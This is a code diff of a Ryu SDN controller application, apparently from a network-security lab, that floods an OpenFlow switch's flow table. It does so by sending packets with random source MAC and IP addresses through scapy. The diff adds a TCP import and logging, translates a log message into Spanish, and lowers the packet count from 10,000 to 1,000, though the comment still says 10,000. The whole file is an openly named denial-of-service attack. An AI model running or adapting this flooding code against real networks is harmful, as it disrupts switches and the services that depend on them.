@@ -2,8 +2,10 @@ from ryu.base import app_manager
 from ryu.controller import ofp_event
 from ryu.controller.handler import MAIN_DISPATCHER, set_ev_cls
 from ryu.ofproto import ofproto_v1_3
-from scapy.all import sendp, Ether, IP, UDP
+from scapy.all import sendp, Ether, IP, UDP, TCP
 import random
+import logging
+logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(message)s')
 
 class FlowTableFloodingAttack(app_manager.RyuApp):
     OFP_VERSIONS = [ofproto_v1_3.OFP_VERSION]
@@ -19,11 +21,11 @@ class FlowTableFloodingAttack(app_manager.RyuApp):
 
     @set_ev_cls(ofp_event.EventOFPSwitchFeatures, MAIN_DISPATCHER)
     def switch_features_handler(self, ev):
-        self.logger.info("Flooding the flow table with random packets")
+        self.logger.info("inundacion de tabla de flujos")
         self.flood_flow_table()
 
     def flood_flow_table(self):
-        for i in range(10000):  # Enviar 10,000 paquetes con diferentes direcciones IP
+        for i in range(1000):  # Enviar 10,000 paquetes con diferentes direcciones IP
             random_mac_src = self.random_mac()
             random_mac_dst = random.choice(self.mac_dst_list)  # Elegir MAC destino aleatoria
             random_ip_src = self.random_ip()
